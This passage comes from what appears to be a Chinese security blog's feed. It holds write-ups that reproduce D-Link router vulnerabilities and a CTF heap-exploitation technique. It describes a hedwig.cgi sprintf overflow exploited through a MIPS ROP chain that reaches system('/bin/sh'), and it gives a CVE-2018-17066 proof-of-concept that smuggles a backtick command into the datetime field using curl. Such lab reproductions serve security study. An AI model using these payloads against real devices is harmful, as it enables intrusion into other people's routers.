src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710176066237-169a4cb0-dfdc-4ddb-95c1-c27f9cc9e172.png"><br>还是一样的原因，用户模拟qemu执行不了system(‘&#x2F;bin&#x2F;sh’)<br>系统模拟：<br><a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dlink-DIR815溢出漏洞复现</title>
      <link href="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="DIR-815溢出漏洞复现"><a href="#DIR-815溢出漏洞复现" class="headerlink" title="DIR-815溢出漏洞复现"></a>DIR-815溢出漏洞复现</h3><p>hedwig.cgi中sprintf的溢出漏洞，对于uid长度没有进行检测</p><span id="more"></span><h6 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h6><p>据漏洞信息漏洞是出现在hedwig.cgi中，hedwig.cgi是指向.&#x2F;htdocs&#x2F;cgibin的符号链接<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708703760589-0984a0ca-36d6-4233-8b1b-fbf34e65027e.png"><br>漏洞点主要就是下图中的spriintf没有对string大小进行限制，而v27只有1024大小，所以会造成溢出漏洞</p><p><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708703791481-76571407-7a4b-464a-a912-aa12f4e5255b.png"><br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708703838539-0a69aa1a-7340-4615-99ce-e8606f65765d.png"><br>这里主要分析一下sess_get_uid函数干了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    cookie_1_idx0 = *cookie_1;</span><br><span class="line">    <span class="keyword">if</span> ( !*cookie_1 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cookie_1_idx0 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        sobj_free(v2);                            <span class="comment">// sobj[5]!= 0 才会free 但前面默认是0</span></span><br><span class="line">        sobj_free(v4);</span><br><span class="line">        LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( cookie_1_idx0 == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v6 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            v6 = <span class="number">2</span>;                                 <span class="comment">// cookie存在且 不为空格和分号</span></span><br><span class="line">            <span class="keyword">if</span> ( cookie_1_idx0 != <span class="string">&#x27;=&#x27;</span> )             <span class="comment">// 遇到等号时 v6=2</span></span><br><span class="line">            &#123;</span><br><span class="line">                sobj_add_char(v2, cookie_1_idx0);     <span class="comment">// 遇到=前 存入到v2中</span></span><br><span class="line">                v6 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )                              <span class="comment">// 遇到等号</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cookie_1_idx0 == <span class="string">&#x27;;&#x27;</span> )               <span class="comment">// 直到 分号</span></span><br><span class="line">        &#123;</span><br><span class="line">            v6 = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        &#125;</span><br><span class="line">        sobj_add_char(v4, *cookie_1++);           <span class="comment">// 遇到=后 存入到v4 直到遇到 ；</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )            <span class="comment">// =前为 uid 结束循环</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        LABEL_18:</span><br><span class="line">        ++cookie_1;                               <span class="comment">// 继续判断下一位</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;                                             <span class="comment">// while循环部分</span></span><br><span class="line"><span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    LABEL_21:</span><br><span class="line">    <span class="built_in">string</span> = sobj_get_string(v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">&#125;</span><br><span class="line">LABEL_27:</span><br><span class="line"><span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);               <span class="comment">// 客户端ip</span></span><br><span class="line">LABEL_22:</span><br><span class="line">sobj_add_string(a1, <span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">if</span> ( v2 )</span><br><span class="line">    sobj_del(v2);</span><br><span class="line"><span class="keyword">if</span> ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br></pre></td></tr></table></figure><p>首先会进入这里，遇到 &#x3D; 前会把cookie的内容存到v2中，v6&#x3D;1<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787188086-9603b1c3-c2e4-4a3f-a2a7-a92a4edf842d.png"><br>然后继续下一位判断<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787247094-79a0adb5-7166-4bab-972c-68b3d7d7426f.png"><br>遇到 &#x3D; 后v6&#x3D;2 进入到<img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787454205-7aaa53b6-a73a-4eaa-be91-51b97efa30de.png"><br>直到 ； 会结束，在遇到；前将cookie存到v4中，直到遇到； v6&#x3D;3<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787466689-d524e587-56ae-48f3-a70d-25e30b4166ed.png"><br>然后v6&#x3D;0，会去判断v2 (等号前部分) 是不是uid，如果不是则继续判断剩下cookie部分；<br>是uid则获取地址给到string，再传给a1（sess_get_uid的参数）<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787557374-ea9770fc-20a5-409f-89c5-d9a9e7818883.png"><br>sobj_get_strin<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787676132-88d2c6b6-3de6-4fa5-9eb1-51f2335d13a1.png"><br>sobj_add_string<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787747539-00a570bf-59ac-4bd5-a0e0-7616cdbcfc90.png"><br>结束sess_get_uid（v4），可以发现没有对v4或string进行检测，也就造成了sprintf的溢出<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708787857485-74926f31-6e2c-4cf4-9e31-19602dc07114.png"></p><h6 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h6><p>为了程序能够成功执行，还需要设定几个环境变量，这里暂时只考虑执行到sess_get_uid函数前的环境变量<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708788354356-6ae5975d-79c1-4764-8c9e-f9cee7991fba.png"><br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708788363527-0b215e7c-f9e6-4fa8-a137-0a687085344d.png"><br>这里也是根据网上其他师傅写的sh脚本，（sudo -E 就是执行时加环境变量）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">test</span>=$(python -c <span class="string">&quot;print &#x27;uid=&#x27;+open(&#x27;payload&#x27;,&#x27;r&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$test</span>&quot;</span> | <span class="built_in">wc</span> -c)  </span><br><span class="line">PORT=<span class="string">&quot;1234&quot;</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span><br><span class="line"><span class="built_in">chmod</span> +x ./qemu</span><br><span class="line">sudo <span class="built_in">chroot</span> . ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span>  -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E HTTP_COOKIE=<span class="variable">$test</span> -E REQUEST_URL=<span class="string">&quot;/hedwig.cgi&quot;</span> -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> -g <span class="variable">$PORT</span> /htdocs/web/hedwig.cgi       </span><br><span class="line"><span class="built_in">rm</span> -f ./qemu     </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行后就可以发现成功溢出了，然后我们就需要确定偏移构造payload<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708788667150-6aa44c7e-7a7b-4793-99fe-77603fd66335.png"><br>通过测试的payload就可以测出溢出的偏移，并且可以发现我们不止可控制ra，还有s0~s7<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708789900122-8a07bbd0-202d-47b7-9ba5-5976a6f5bbac.png"><br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708789831556-f31b6823-4815-453d-a003-6be1996d64a5.png"></p><h6 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h6><p>不知道为什么我vmmap看不到libc的基地址，可能没有载入qemu的内存映射？<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708790432301-28ed5b77-95c4-4903-b1ea-48a4290edf12.png"><br>将libuClibc文件拖入ida找到sprintf地址为0x0002DA70<br>在程序运行中找到sprintf地址为0x7f765a70，使用libc基地址为0x7f765a70-0x0002DA70&#x3D;0x7f738000<br>然后就是去找可利用的gadget，可以使用ROPgadget，不过用起来体验不是很好，可以将找到的内容放入到文本中再去找相关寄存器<br>可以使用ida的mipsrop插件  mipsrop.find(“”) 来找需要的gadget<br>第一个gadget：为了执行system(‘&#x2F;bin&#x2F;sh’)，需要控制第一个参数即a0，因为mips的分支延迟效应，所以跳转后的第一条指令也是会被执行的，sp+0x14c-0x13c和s0是我们可控的，利用这个gadget我们便可以控制a0，且继续控制程序流<img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708935227108-c713eaba-ec6d-43fa-9b41-8986af9d3fbd.png"><br>第二个gadget：因为sprintf会被\x00截断，而system地址为libuc_base + 0x53200，所以这里我们输入system_adr-1，利用该gadget去+1，且s5也是可控<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708935459159-03781259-e1c3-40fc-be70-e009bc7d352c.png"><br>即ra&#x3D;gadget2 —&gt; 使s0 (system-1) +1 并ja到 gadget1 —&gt; 使a0&#x3D;&#x2F;bin&#x2F;sh，并ja到system<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708949647470-806bc0bd-3e56-4a9b-8dd9-deef83e3c897.png"><br>在执行时会报如下错，手动添加文件即可<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708794777667-060efae2-f23c-43d3-a5ed-2dc9a9402f78.png"><br>可以看到我们成功执行到了system(&#x2F;bin&#x2F;sh)，但是因为我们是qemu的用户模式模拟的，在system中的fork()函数会失败<br><img src="/2024/02/25/Dlink-DIR815%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1708794597506-a00aff4d-9831-479f-982a-387f48b7482b.png"><br>quem系统模式：<br><a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2018-17066复现</title>
      <link href="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>漏洞编号：CVE-2018-17066<br>DIR-816 漏洞在&#x2F;bin&#x2F;goahead程序中，系统中自带system直接执行，且参数为输入内容</p><span id="more"></span><p><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699874649517-3352471b-cf5e-4b2a-b9e8-c2ce12a15129.png"></p><p><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699874668792-d90ca29f-5847-4cbe-8075-5de53e4564bb.png"><br>dosystem中没有对Var进行任何检测，开始想的是可以直接输入字符，但web页面对输入进行了检测，这里要用到命令注入（转战web XD），修改datetime的值。</p><h4 id="固件下载："><a href="#固件下载：" class="headerlink" title="固件下载："></a>固件下载：</h4><p>这个固件可以从官网下载：<a href="http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816">http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816</a><br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699875801623-63f2e896-4890-4cd2-81d9-9abc4e1472d7.png"><br>下载之后binwalk解包得到squashfs-root<br>下载固件、binwalk提取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me xxx</span><br></pre></td></tr></table></figure><p>一般web根目录可以用该命令找出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name &#x27;&#x27;*index*&#x27;&#x27;</span><br></pre></td></tr></table></figure><h4 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h4><p>因为明确是goahead程序，直接启动试一试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-mipsel -L ./ ./bin/goahead</span><br></pre></td></tr></table></figure><p>卡在等待nvram_daemon，可以进ida看看<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699876254348-b5b07fca-60fb-411e-9215-317c0ebceb02.png"><br>通过字符串查找可以找到这里，程序要打开nvramd.pid文件，但我们解包的固件var下是空但，所以会卡在这里，本地实现的话可以动态调试把v1改为1，跳出循环<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699876354996-be2615c7-795e-4504-a71d-0718485b1688.png"><br>打个断点<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699876606686-be56212c-39b0-4362-8dd4-7443f3661d73.png"><br>再试一试<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699876684428-f000e68d-574a-4cb6-b5e4-a5a283019de5.png"><br>继续执行会直接退出了，发现有新问题，一样利用字符串搜索看一下<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699876732651-01e356c2-61f3-4da9-933c-16d37e57728d.png"><br>这里停在判断nvram_bufget获取lan_ipaddr的值，同样打个断点修改v19的值就好<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699876833057-8e9a7cbf-249d-4e7a-b101-443d565e8e0a.png"><br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699876848152-c2fc6849-ee92-4bd2-9921-840a4fbcb175.png"><br>然后继续运行，就正常的在跑了<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699877418646-41629a6f-e844-47ba-9e23-13ff8ebf1b38.png"></p><h4 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h4><p>然后我们就可以去访问web页面了，先随便输一下用户和密码<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699878668040-40475782-131d-4368-91c2-d5ce676f7fd6.png"><br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699878846410-e91ebfa7-e1ec-4562-be81-66b3de4d8ff4.png"><br>此时ida停在了对password判断位置，这里可以大致看一下程序、从web端得到username和password进行decode64之后与nvram_bufgey得到的用strcmp比较、既然用的strcmp我们可以直接为空来绕过<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699879307042-a7ca45aa-08e3-4770-b69d-16caa2ea5889.png"><br>不过web页面限制了必须输入用户名，不过我们依然可以在ida中直接去修改（看师傅说可以改前端 不会XD）<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699879458579-7c590496-9df3-42a4-b798-83d843b2411a.png"><br>这里是对username的判断后的跳转，把v0设置为0即可，然后就可以登录成功了<br>我们去访问d_wizard_step1_start.asp，找到漏洞触发点（更新时间）<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699880148219-55f07052-8b74-48a7-8337-4896c233ad8c.png"><br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699880242330-4b6652e6-b2fc-4788-9771-e3eb8b1ff1db.png"><br>这里web页面对输入有限制，可以利用burp suite进行抓包修改发送的数据<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699880267787-b0729969-6804-4cb1-bf79-bb5bf6e4ca9f.png"><br>（自己电脑bp可能是环境配置问题吧、一直没搞好 暂时用的kali自己带的）<br>这里以ls为例<br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699880462339-4f9dc3c0-f803-4820-b3c6-f2e561f118e4.png"><br><img src="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/1699880493776-79e480b6-866b-48b3-b94e-2c4ac4a0f337.png"></p><h4 id="概念验证（官方）"><a href="#概念验证（官方）" class="headerlink" title="概念验证（官方）"></a>概念验证（官方）</h4><p>路由需要一个随机令牌，该令牌用作针对 CSRF 的缓解措施。因此，首先我们需要获取它的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TOKENID=`curl -s http://192.168.0.1/dir_login.asp | grep tokenid | head -1 | grep -o &#x27;value=&quot;[0-9]*&quot;&#x27; | cut -f 2 -d = | tr -d &#x27;&quot;&#x27;`</span><br></pre></td></tr></table></figure><p>然后，我们可以将构建的参数与令牌一起发送到路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://192.168.0.1/goform/form2systime.cgi -d tokenid=$TOKENID -d &#x27;datetime=`sleep 5`-:&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> iot </tag>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house-of-cat学习以及复现</title>
      <link href="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h3><p>只要可以largebin（任意地址写入可控地址）就可以实现，要求很低<br>同house of emma，前面的利用链仍然是<code>__fxprintf --&gt; locked_vfxprinf --&gt; __vfprintf_internal --&gt; _IO_default_xsputn</code>，然后利用去调用<code>_IO_default_xsputn</code>时修改vtable在合理范围的偏移去执行我们想要的内容，house of cat利用的是<code>_IO_wfile_seekoff</code>，当然也可以通过FSOP来完成这一步</p><span id="more"></span><p><code>_IO_wfile_seekoff ----&gt; _IO_switch_to_wget_mode：</code><br><code>rdi = stderr ---&gt; rax1 = stderr + 0xa0 ----&gt; rax2 = rax1 + 0xe0 ----&gt; call rax2 + 0x18</code><br><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695384878576-0c135b74-d7a6-431d-8c3a-01abaf2be949.png" alt="img"><br>因为rdi是可控的，所以程序流可控且rdx可控，就可以去执行setcontext+orw了</p><h3 id="强网杯2022-house-of-cat"><a href="#强网杯2022-house-of-cat" class="headerlink" title="强网杯2022|house of cat"></a>强网杯2022|house of cat</h3><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1583();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_155E();</span><br><span class="line">    c_write(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x3C</span>uLL);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3B</span>uLL);</span><br><span class="line">    sub_19D6(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要绕过的判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1A50</span><span class="params">(<span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+20h] 